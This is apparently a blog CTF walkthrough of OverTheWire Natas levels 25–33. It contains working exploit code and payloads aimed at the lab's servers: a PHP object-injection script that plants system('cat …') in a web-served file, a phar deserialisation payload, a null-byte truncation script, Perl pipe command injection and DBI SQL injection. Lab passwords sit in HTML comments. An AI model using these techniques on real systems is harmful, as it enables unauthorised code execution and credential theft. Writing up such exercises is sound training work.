+<p>It seems like these texts are stored in files on the server, and when a language is selected by the user the corresponding file is retrieved from the server and displayed - &lsquo;de&rsquo; and &rsquo;en&rsquo; are actually files on the server. When a request is sent to the server, the file to load, which is the value of the <code>lang</code> parameter, is retrieved by the <code>setLanguage</code> function, which then sends &rsquo;langauge/&lt;file to include&gt;&rsquo; to the <code>safeInclude</code> function. This function does two checks on the sent file path to counter path traversal, and then includes the file in the webpage contents, printing the contents of the specified file for us to see.</p>
+<p>The first check <code>safeInclude</code> does is remove any instances of &lsquo;../&rsquo; to stop references to the parent directory of the current directory. Fortunately, this filter is easy to beat as it does <em>only</em> a single pass of the filename and replaces instances of &lsquo;../&rsquo; with the empty string. We can beat this filter by typing &lsquo;&hellip;.//&rsquo; wherever we mean &lsquo;../&rsquo;, because the former becomes the latter after the replacement is performed.</p>
+<p>Let us access the log file using this. We know from the source that the <code>language</code> subdirectory is in the same subdirectory of the homepage of the site, <code>index.php</code>. Specifically, both <code>language</code> and <code>index.php</code> are located at <code>/var/www/natas/natas25</code>. We know that if &lsquo;&lt;input&gt;&rsquo; is the value of the <code>lang</code> parameter when we make the request, the full path of the file included is <code>/var/www/natas/natas25/language/&lt;input&gt;</code>.</p>
+<p>Since we know the location of the log file, we can specify the value of <code>lang</code> to be &lsquo;&hellip;.//logs/natas25_&lt;sessionid&gt;.log&rsquo; to display the log file of the session, as the final path of the file included will be <code>/var/www/natas/natas25/language/../logs/natas25_&lt;sessionid&gt;.log</code>, i.e. <code>/var/www/natas/natas25/logs/natas25_&lt;sessionid&gt;.log</code>.</p>
+<p><a href="/images/otw_natas/natas25-1_getting-log.png"><img src="/images/otw_natas/natas25-1_getting-log.png" alt="retrieving contents of log file using path traversal"></a></p>
+<p>The second <code>safeInclude</code> filter is less straightforward to bypass. It looks for instances of the substring &rsquo;natas_webpass&rsquo; in the provided filename, terminating the file inlcusion and loading <code>language/en</code> instead. This means we are unable to use file traversal to directly include <code>/etc/natas_webpass/natas26</code>.</p>
+<p>If we look at the source code again, we see that the <code>logRequest</code> function is exploitable as it writes the value of the <code>HTTP_USER_AGENT</code> field from the request into the log file without any sanitisation. Since we can modify the &lsquo;user-agent&rsquo; field when we send the request, we can write arbitrarily to the log file:</p>
+<p><a href="/images/otw_natas/natas25-2_arbitrary-write-to-log.png"><img src="/images/otw_natas/natas25-2_arbitrary-write-to-log.png" alt="writing to the log"></a></p>
+<p>This means we can inject PHP code to write the natas26 password on the log file. When the log file is loaded, the PHP injected will be rendered, printing the password:</p>
+<p><a href="/images/otw_natas/natas25-3_getting-password.png"><img src="/images/otw_natas/natas25-3_getting-password.png" alt="injecting PHP to print the password"></a></p>
+<!-- 8A506rfIAXbKKk68yJeuTuRq4UfcK70k -->
+<h3 id="a-namelevel-26a-level-26"><a name="level-26"></a> Level 26</h3>
+<p>This level is quite challenging. I had to consult an <a href="https://www.youtube.com/watch?v=IgxhtJQL-gY&amp;ab_channel=JohnHammond">online resource</a> to discover that I had to perform an object injection using insecure object deserialisation.</p>
+<p>We see in the code that there is a <code>drawing</code> cookie which basically stores data representing all lines which have been drawn during the session.</p>
+<p>When a request is sent, the program takes the value of the <code>drawing</code> cookie, base64-decodes it, then unserialises it to retrieve an array of coordinates representing previously drawn lines. It then reads the coordinates of each line and draws them. The program then adds any newly drawn lines to the array of coordinates, serialises the array, base64-encodes it, and stores it in the <code>drawing</code> cookie for future requests.</p>
+<p>The serialisation and unserialisation involved in storing information on drawn lines makes it vulnerable to <a href="https://www.sonarsource.com/blog/php-object-injection/">object injection</a>. We can create an object, serialise it, and pass inject it into the program through the <code>drawing</code> cookie. The injected object will be unserialised by the program.</p>
+<p>We can take advantage of the <a href="https://www.php.net/manual/en/language.oop5.magic.php">magic methods</a> of the injected object, which are methods which execute &lsquo;automatically&rsquo; at certain stages in the execution of the wider program. We see that there is a defined <code>Logger</code> class with magic methods <code>__construct</code> and <code>__destruct</code>. We can send a customised serialised <code>Logger</code> object to the program. We see that each <code>Logger</code> object has 3 object variables: an init message, exit message, and a location to write all log messages to. The init and exit messages will be written to the specified log file automatically when the magic methods <code>__construct</code> and <code>__destruct</code> are executed.</p>
+<p>To exploit this, we can create a <code>Logger</code> object with the messages being PHP code to retrieve the password for natas27 and the log file destination being somewhere we are able to access and read.</p>
+<p>We can use PHP to help us generate the custom serialised <code>Logger</code> object:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">class</span> <span style="color:#f3f99d">Logger</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">private</span> <span style="color:#ff5c57">$logFile</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">private</span> <span style="color:#ff5c57">$initMsg</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">private</span> <span style="color:#ff5c57">$exitMsg</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">function</span> __construct(){
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e">// initialise variables
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span>        <span style="color:#ff5c57">$this</span><span style="color:#ff6ac1">-&gt;</span><span style="color:#57c7ff">initMsg</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;start: &lt;?php system(&#39;cat /etc/natas_webpass/natas27&#39;); ?&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$this</span><span style="color:#ff6ac1">-&gt;</span><span style="color:#57c7ff">exitMsg</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;end: &lt;?php system(&#39;cat /etc/natas_webpass/natas27&#39;); ?&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$this</span><span style="color:#ff6ac1">-&gt;</span><span style="color:#57c7ff">logFile</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;img/password.php&#34;</span>; <span style="color:#78787e"># has to be a PHP file for the written injected PHP code to be executed
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$obj</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> Logger();
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">print</span>(serialize(<span style="color:#ff5c57">$obj</span>)<span style="color:#ff6ac1">.</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">print</span>(base64_encode(serialize(<span style="color:#ff5c57">$obj</span>)));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p>A large chunk of the <code>Logger</code> class code is removed or modified to prevent errors - we only need the object variables <code>initMsg</code>, <code>exitMsg</code>, and <code>logFile</code> to create a proper <code>Logger</code> object. This can be seen from inspecting the serialised object created from the script above:</p>
+<p><a href="/images/otw_natas/natas26-1_serialised-object.png"><img src="/images/otw_natas/natas26-1_serialised-object.png" alt="Output of script above"></a></p>
+<p>We can then send the base64 encoded object as the value of the <code>drawing</code> cookie. If the object injection is successful, we should see the following error as the injected object is deserialised:</p>
+<blockquote>
+<p>Fatal error: Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105 Stack trace: #0 /var/www/natas/natas26/index.php(131): storeData() #1 {main} thrown in /var/www/natas/natas26/index.php on line 105</p>
+</blockquote>
+<p>We can then navigate to <code>img/password.php</code> to retrieve the password for the next level.</p>
+<p><a href="/images/otw_natas/natas26-2_password-retrieved.png"><img src="/images/otw_natas/natas26-2_password-retrieved.png" alt="password for natas27 printed at specified destination"></a></p>
+<p>Only &rsquo;end: &hellip;&rsquo; is printed instead of &lsquo;start&rsquo; because the <code>__construct</code> magic method isn&rsquo;t called since we are passing in an already constructed <code>Logger</code> object. Therefore, only <code>__destruct</code> is called.</p>
+<!-- PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3 -->
+<h3 id="a-namelevel-27a-level-27"><a name="level-27"></a> Level 27</h3>
+<p>The application functions as such:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>user &lt;- user provided username
+</span></span><span style="display:flex;"><span>password &lt;- user provided password
+</span></span><span style="display:flex;"><span>if user in database: # alpha
+</span></span><span style="display:flex;"><span>    if user and password in &gt;0 entries in database: # beta
+</span></span><span style="display:flex;"><span>        fetch row with username == user and print username and password
+</span></span><span style="display:flex;"><span>    else:
+</span></span><span style="display:flex;"><span>        prompt &#39;wrong password&#39;
+</span></span><span style="display:flex;"><span>else:
+</span></span><span style="display:flex;"><span>    INSERT new entry in database with provided username and password
+</span></span></code></pre></div><p>If we enter &rsquo;natas28&rsquo; as the user (with any password), it prompts us that the password is wrong. From this we can deduce that an entry for natas28 exists in the database.</p>
+<p>Due to <code>mysqli_real_escape_string</code>, typical SQL injections won&rsquo;t work because &quot; and &rsquo; will be <a href="https://www.php.net/manual/en/mysqli.real-escape-string.php">escaped</a>.</p>
+<p>Full disclosure: I couldn&rsquo;t solve this without help from walkthroughs for this level. This <a href="https://n0j.github.io/2017/07/20/otw-natas-27.html">writeup</a> explains the vulnerability and the exploit quite well. Essentially, if our input is longer than 64 characters, it gets truncated to 64 characters and stored. If we enter &rsquo;natas28&rsquo; followed by 64 whitespace characters and a random character behind with any password of our choice, for example &lsquo;abcde&rsquo;, it will be considered a new user and will be added to the database.</p>
+<p>However, becuase it is longer than 64 characters, when it is stored it is truncated to just &rsquo;natas28&rsquo; followed by trailing whitespace. Due to a bug in mysql, &rsquo;natas28&rsquo; and &rsquo;natas28&rsquo; followed by trailing whitespace are the same. This means that when we try logging in using user=natas28 and password=abcde, we will pass not only check alpha in the code above, but also check beta because of the user we just inserted. But since the natas28 entry we created and the one already in the database both have the same username (at least according to the server), the <code>fetch</code> command would retrieve the credentials of the entry already in the database since it came first.</p>
+<p>I tried following the many solutions online which used the space character to create the whitespace in username, but none of them seemed to work. It was only after coming across <a href="https://blog.csdn.net/mengzh620/article/details/130342758">this post</a> did I try using &lsquo;\x00&rsquo; - the null byte character - instead of spaces, and that did the trick! The following is script used to solve this challenge:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> requests.auth <span style="color:#ff6ac1">import</span> HTTPBasicAuth
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://natas27.natas.labs.overthewire.org/&#34;</span>
+</span></span><span style="display:flex;"><span>basic <span style="color:#ff6ac1">=</span> HTTPBasicAuth(<span style="color:#5af78e">&#34;natas27&#34;</span>, <span style="color:#5af78e">&#34;&lt;natas 27 password&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff6ac1">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;username&#34;</span>:<span style="color:#5af78e">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;password&#34;</span>:<span style="color:#5af78e">&#34;pass&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session <span style="color:#ff6ac1">=</span> requests<span style="color:#ff6ac1">.</span>Session()
+</span></span><span style="display:flex;"><span>payload[<span style="color:#5af78e">&#39;username&#39;</span>] <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;natas28&#39;</span> <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#39;</span><span style="color:#5af78e">\x00</span><span style="color:#5af78e">&#39;</span> <span style="color:#ff6ac1">*</span> <span style="color:#ff9f43">58</span> <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#39;a&#39;</span>
+</span></span><span style="display:flex;"><span>response <span style="color:#ff6ac1">=</span> session<span style="color:#ff6ac1">.</span>post(url, auth<span style="color:#ff6ac1">=</span>basic, data<span style="color:#ff6ac1">=</span>payload)
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">print</span>(response<span style="color:#ff6ac1">.</span>text)
+</span></span><span style="display:flex;"><span>payload[<span style="color:#5af78e">&#39;username&#39;</span>] <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;natas28&#39;</span>
+</span></span><span style="display:flex;"><span>response <span style="color:#ff6ac1">=</span> session<span style="color:#ff6ac1">.</span>post(url, auth<span style="color:#ff6ac1">=</span>basic, data<span style="color:#ff6ac1">=</span>payload)
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">print</span>(response<span style="color:#ff6ac1">.</span>text)
+</span></span></code></pre></div><!-- skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4 -->
+<h3 id="a-namelevel-28a-level-28"><a name="level-28"></a> Level 28</h3>
+<p>I skipped this level because I couldn&rsquo;t solve this challenge on my own, I barely understood the writeups for this challenge, and I don&rsquo;t have much interest in concepts tested (some complex cyryptography).</p>
+<p>Here are some walkthroughs which I think are quite comprehensive:</p>
+<ul>
+<li><a href="https://learnhacking.io/overthewire-natas-level-28-walkthrough/">https://learnhacking.io/overthewire-natas-level-28-walkthrough/</a></li>
+<li><a href="https://bernardoamc.com/ecb-discover-block-size/">https://bernardoamc.com/ecb-discover-block-size/</a></li>
+<li><a href="https://bernardoamc.com/ecb-decryption-simple/">https://bernardoamc.com/ecb-decryption-simple/</a></li>
+</ul>
+<!-- pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno -->
+<h3 id="a-namelevel-29a-level-29"><a name="level-29"></a> Level 29</h3>
+<p>Disclaimer: I referenced <a href="https://ivanitlearning.wordpress.com/2020/02/02/overthewire-natas2729/">this writeup</a> to solve this challenge.</p>
+<p>This site gives us the ability to choose from 5 different options, which will display 5 different text files on the site. When we select any of the 5 options, we see that the URL becomes the following:</p>
+<p><a href="/images/otw_natas/natas29-1_url.png"><img src="/images/otw_natas/natas29-1_url.png" alt="change in URL"></a></p>
+<p>Specifically, selecting any of these files introduces a URL query parameter &lsquo;file&rsquo;, the value of which is whatever file we chose to display. This hints that a local file inclusion or injection attack might be possible.</p>
+<p>We can gess that the homepage, <code>index.pl</code>, uses the perl <code>open()</code> function to open and display the selected file. <code>open()</code> seems to be susceptible to command injection using the pipe symbol &lsquo;|&rsquo; as a delimiter <a href="https://nets.ec/Command_Injection#Perl">(source)</a>.</p>
+<p>The <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection">OWASP web security testing guide</a> demonstrates how to test this: we just prepend &lsquo;| &rsquo; to our command, append a semicolon after the command, and enter the whole string as the value of <code>file</code>. The following demonstrates running <code>ls -la</code> on the server using this method (query string is url encoded):</p>
+<p><a href="/images/otw_natas/natas29-2_injection-demo.png"><img src="/images/otw_natas/natas29-2_injection-demo.png" alt="output of injecting ls -la command"></a></p>
+<p>We can try to directly access the natas30 password but we get the following:</p>
+<p><a href="/images/otw_natas/natas29-3_access-fail.png"><img src="/images/otw_natas/natas29-3_access-fail.png" alt="failure to get password"></a></p>
+<p>Instead of the password, we see &lsquo;meeeeeep!&rsquo; being printed on the site. If we look at <code>index.pl</code>, we see that there is some kind of filtering going on which causes &lsquo;meeeeeep!&rsquo; to be printed:</p>
+<p><a href="/images/otw_natas/natas29-4_filter-in-source.png"><img src="/images/otw_natas/natas29-4_filter-in-source.png" alt="code in index.pl"></a></p>
+<p>We see that &lsquo;meeeeeep!&rsquo; is printed when the filename specified contains &rsquo;natas&rsquo;, else the file is opened and displayed for the user. To get past this, we can use the &lsquo;?&rsquo; <a href="https://en.m.wikipedia.org/wiki/Glob_(programming)">glob / wildcard character</a> to substitute a letter in &rsquo;natas&rsquo;. For example, if we run <code>cat ?ile</code>, the system will look for a file with a 4 character long filename which ends with &lsquo;ile&rsquo; and open it. If we run <code>ls /etc/????</code>, the system will look for a subdirectory in <code>etc</code> with a 4 character long name and list its contents.</p>
+<p>In our case, instead of <code>/etc/natas_webpass/natas30</code>, we can pass in <code>/etc/nata?_webpass/nata?30</code>. This bypasses the filtering in <code>index.pl</code> and gives us the contents of the file:</p>
+<p><a href="/images/otw_natas/natas29-5_success.png"><img src="/images/otw_natas/natas29-5_success.png" alt="successfully viewing contents of password file"></a></p>
+<!-- Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X -->
+<h3 id="a-namelevel-30a-level-30"><a name="level-30"></a> Level 30</h3>
+<p>This challenge is another SQL injection. If we inspect the source, we see that the user input is filtered using the <code>quote</code> function before the query is executed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>password <span style="color:#ff6ac1">=</span><span style="color:#ff5c57">&#34;</span><span style="color:#ff6ac1">.</span><span style="color:#ff5c57">$dbh</span><span style="color:#ff6ac1">-&gt;</span>quote(param(<span style="color:#5af78e">&#39;password&#39;</span>))
+</span></span></code></pre></div><p>This means that typical SQL injection strings such as &ldquo;&lsquo;or 1=1&ndash;&rdquo; won&rsquo;t work because the quotation marks will be escaped.</p>
+<p>However, the code is still vulnerable to SQL injection because of the <code>param</code> function used to retrieve the passed values in the http request. These sources explain this vulnerability: <a href="https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection">source 1</a>, <a href="https://stackoverflow.com/questions/40273267/is-perl-function-dbh-quote-still-secure">source 2</a>.</p>
+<p>Essentially, <code>quote</code> has an optional second parameter <code>$data_type</code> <a href="https://metacpan.org/release/TIMB/DBI-1.637/view/DBI.pm#quote">(source)</a>. If two arguments are passed to <code>quote</code>, the second indicates the data type of the first argument and <code>quote</code> &lsquo;handles&rsquo; the first argument based on the indicated data type. Crucially, if the data type passed is a numeric type like &lsquo;SQL_INTEGER&rsquo;, then no escaping will be done on the first argument. This means that if we pass in an SQL injection string as first argument, and specify that it is an SQL_INTEGER type in the second argument, then the quotations in the injection string won&rsquo;t be escaped and the injection will work.</p>
+<p>Due to some quirks in perl (which I can&rsquo;t say I fully understand), if we pass in an array when calling <code>quote</code>, where the second element of the array will be recognised as the <code>$data_type</code> of the first element of the array.</p>
+<p>It turns out we can get <code>param</code> to return an array by specifying multiple values for the same parameter in the http request. For example, if our request has <code>...&amp;password=foo&amp;password=bar</code>, <code>param</code> will return a 2 membered array [foo, bar] to <code>quote</code> in the password section of the query.</p>
+<p>Therefore, our request will have the following parameters:</p>
+<ul>
+<li><code>username = natas31</code></li>
+<li><code>password = &quot;&quot; or 1=1--</code></li>
+<li><code>password = 4</code></li>
+</ul>
+<p>This payload means that the array [&quot;&quot; or 1=1&ndash;, 4] will be passed to <code>quote</code> to construct the password value of the query. The second argument in the array, &lsquo;4&rsquo;, will be recognised as the data-type of the SQL injection string, and since 4 represents the <code>SQL_INTEGER</code> type, the first element of the array, the injection string, won&rsquo;t be escaped and will be executed as is (I can&rsquo;t find any docs on why SQL_INTEGER == 4 but source 1 above specifies so).</p>
+<p>A successful SQL injection gives us the password:</p>
+<p><a href="/images/otw_natas/natas30-1_success.png"><img src="/images/otw_natas/natas30-1_success.png" alt="successful SQL injection"></a></p>
+<!-- AMZF14yknOn9Uc57uKB02jnYuhplYka3 -->
+<h3 id="a-namelevel-31a-level-31"><a name="level-31"></a> Level 31</h3>
+<p>The site allows us to upload a CSV, which will be converted to HTML and displayed on screen:</p>
+<p><a href="/images/otw_natas/natas31-1_normal-example.png"><img src="/images/otw_natas/natas31-1_normal-example.png" alt="normal use of web app"></a></p>
+<p>We can see that the site takes the values in the CSV and adds the <code>&lt;th&gt;</code> and <code>&lt;tr&gt;</code> HTML tags to format the data to be shown on the site. Due to this behaviour, a reflected cross site scripting attack might be possible. But simply sending HTML-tagged elements in the CSV won&rsquo;t work, probably because of the <a href="https://perldoc.perl.org/5.8.4/CGI#AUTOESCAPING-HTML"><code>escapeHTML</code> function</a> used to process the CSV values:</p>
+<p><a href="/images/otw_natas/natas31-2_xss-fail.png"><img src="/images/otw_natas/natas31-2_xss-fail.png" alt="xss fail"></a></p>
+<p>I sought help from a <a href="https://learnhacking.io/overthewire-natas-level-31-walkthrough/">walkthorugh</a> and it referenced <a href="https://www.youtube.com/watch?v=BYl3-c2JSL8&amp;ab_channel=BlackHat">a talk</a> Netanel Rubin gave at Blackhat 2016 called &lsquo;The Perl Jam 2&rsquo;. Rubin discusses vulnerabilities in Perl and demonstrates exploiting these vulnerabilities for local file inclusion and remote code execution.</p>
+<p>If we apply Rubin&rsquo;s ideas to our context, to get the password for natas32 from the server all we need to do is:</p>
+<ol>
+<li>in addition to legitimate csv data, add an entry for the <code>file</code> parameter with the value &lsquo;ARGV&rsquo; placed before the legitimate csv data</li>
+<li>specify the file we want the system to open in the url query string</li>
+<li>make the request and see the password get printed out</li>
+</ol>
+<p>Putting this together in Burpsuite, we get:</p>
+<p><a href="/images/otw_natas/natas31-3_exploit.png"><img src="/images/otw_natas/natas31-3_exploit.png" alt="crafting and executing the exploit in burp"></a></p>
+<p>Lines 16-19 show point 1; essentially duplicate the request data formed from uploading the legitimate csv and change the values (there cannot be a blank line between 19 and 20 if not it won&rsquo;t work).</p>
+<p>Line 1 shows how to format the query string in point 2.</p>
+<p>I will not explain why this works since its not possible for me to cover it more concisely than Rubin did in <a href="https://www.youtube.com/watch?v=BYl3-c2JSL8&amp;ab_channel=BlackHat">his talk</a>. Please watch it :-)</p>
+<!-- Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G -->
+<h3 id="a-namelevel-32a-level-32"><a name="level-32"></a> Level 32</h3>
+<p>The source for this level is similar to the previous level. The task in this level is to achieve RCE to run a binary in the root directory. We know how to conduct an RCE from <a href="https://www.youtube.com/watch?v=BYl3-c2JSL8&amp;ab_channel=BlackHat">Rubin&rsquo;s presentation</a>: instead of specifying the file we want to open in the query string, we enter the command we want to execute and append a pipe character (&rsquo;|&rsquo;) at the end of it. Everything else in the request body stays the same.</p>
+<p>For example, to run <code>ls</code> in the webroot:</p>
+<p><a href="/images/otw_natas/natas32-1_ls.png"><img src="/images/otw_natas/natas32-1_ls.png" alt="remotely executing the ls command in webroot"></a></p>
+<p>Few things to take note:</p>
+<ul>
+<li>The folder needs to be specified. In this case we need to use &lsquo;.&rsquo; to specify the webroot directory.</li>
+<li>The space character needs to be encoded using &lsquo;%20&rsquo; instead of the typical &lsquo;+&rsquo; for this to work.</li>
+<li>There needs to be a space before the final | character.</li>
+</ul>
+<p>We see from the output of the <code>ls .</code> command that there is a file called <code>getpassword</code>. Executing it and getting the password for natas33 just involves replacing <code>ls%20.%20|</code> with <code>./getpassword%20|</code> and sending the request.</p>
+<!-- APwWDD3fRAf6226sgBOBaSptGwvXwQhG -->
+<h3 id="a-namelevel-33a-level-33"><a name="level-33"></a> Level 33</h3>
+<p>Looking at the code, we see that it allows us to upload a file, it then executes the file if the md5 hash of the file matches one which is specified. The solution seems to involve uploading a PHP script to retrieve the natas34 password and getting that script to somehow pass the md5 check so it will be executed. md5 hash collisions are possible but solving this by crafting a PHP script which matches the hash specified in the source seems extremely unlikely. This means that we need to pass the md5 check some other way.</p>
+<p>Since the specified hash is stored in an <code>Executor</code> object variable, <code>$signature</code>, my first thought was to carry out an object injection attack. If it is possible to inject an <code>Executor</code> object, we can control what value <code>$signature</code> has - we can just change it to the md5 value of our PHP script. However, the usual channels for object injection, (un)serialisation function(s), are missing from the source.</p>
+<p>After seeking some hints, I got made aware of phar (PHP archive) deserialisation. Sam Thomas has <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">a paper</a> about this.</p>
+<p><a href="https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability">This writeup</a> provides an overview of what a phar deserialisation attack is and how such an attack is performed. <a href="https://axcheron.github.io/writeups/otw/natas/#natas-33-solution">This writeup</a> explains how to conduct the phar deserialisation exploit on natas33.</p>
+<p>To perform this attack, we need to prepare 2 files: <code>getpassword.php</code> and <code>payload.phar</code>.</p>
+<p><code>getpassword.php</code> is a simple php script which reads the password of <code>natas34</code>. I used the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">echo</span> file_get_contents(<span style="color:#5af78e">&#39;/etc/natas_webpass/natas34&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p><code>payload.phar</code> is a php archive file which will contain, in its metadata field, the <code>Executor</code> object we want to inject. The following is a script which will help generate <code>payload.phar</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">class</span> <span style="color:#f3f99d">Executor</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">private</span> <span style="color:#ff5c57">$filename</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;getpassword.php&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">private</span> <span style="color:#ff5c57">$signature</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">True</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">private</span> <span style="color:#ff5c57">$init</span><span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">False</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$obj</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> Executor();
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">@</span>unlink(<span style="color:#5af78e">&#34;payload.phar&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$payload</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> Phar(<span style="color:#5af78e">&#34;payload.phar&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$payload</span><span style="color:#ff6ac1">-&gt;</span><span style="color:#57c7ff">startBuffering</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$payload</span><span style="color:#ff6ac1">-&gt;</span><span style="color:#57c7ff">setStub</span>(<span style="color:#5af78e">&#34;&lt;?php echo &#39;natas33&#39;; __HALT_COMPILER();&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$payload</span><span style="color:#ff6ac1">-&gt;</span><span style="color:#57c7ff">addFromString</span>(<span style="color:#5af78e">&#34;test.txt&#34;</span>, <span style="color:#5af78e">&#39;test&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$payload</span><span style="color:#ff6ac1">-&gt;</span><span style="color:#57c7ff">setMetadata</span>(<span style="color:#ff5c57">$obj</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$payload</span><span style="color:#ff6ac1">-&gt;</span><span style="color:#57c7ff">stopBuffering</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p>We see that the <code>Executor</code> object is defined with variables which suit our needs: <code>$filename</code> is the name of the script which will retrieve the password for us, <code>getpassword.php</code>. To save some effort, <code>$signature</code> is set to <code>True</code> (instead of the md5 hash of <code>getpassword.php</code>) to make use of <a href="https://secops.group/php-type-juggling-simplified/">PHP type juggling</a> (where any string is equal to True when loose comparison is used).</p>
+<p>The next step is to upload both <code>getpassword.php</code> and <code>payload.phar</code> to the website. It doesn&rsquo;t matter in which order; both files will fail the md5 check and hence not execute.</p>
+<p>Once these files are uploaded, the final step is to induce desearilisation of the archived <code>Executor</code> object in <code>payload.phar</code>. We do this by making a request to the server as if we were going to upload a file, but we change the name of the file to &lsquo;phar://payload.phar&rsquo;:</p>
+<p><a href="/images/otw_natas/natas33_finalstep.png"><img src="/images/otw_natas/natas33_finalstep.png" alt="request to trigger deserialisation"></a></p>
+<p>If we forward the request, we will see a few error messages relating to &lsquo;phar://payload.phar&rsquo;, which is to be expected, but we will also see <code>getpassword.php</code> being executed, and the password being printed out:</p>
+<p><a href="/images/otw_natas/natas33-1_final-step.png"><img src="/images/otw_natas/natas33-1_final-step.png" alt="successfully executing phar deserialization"></a></p>
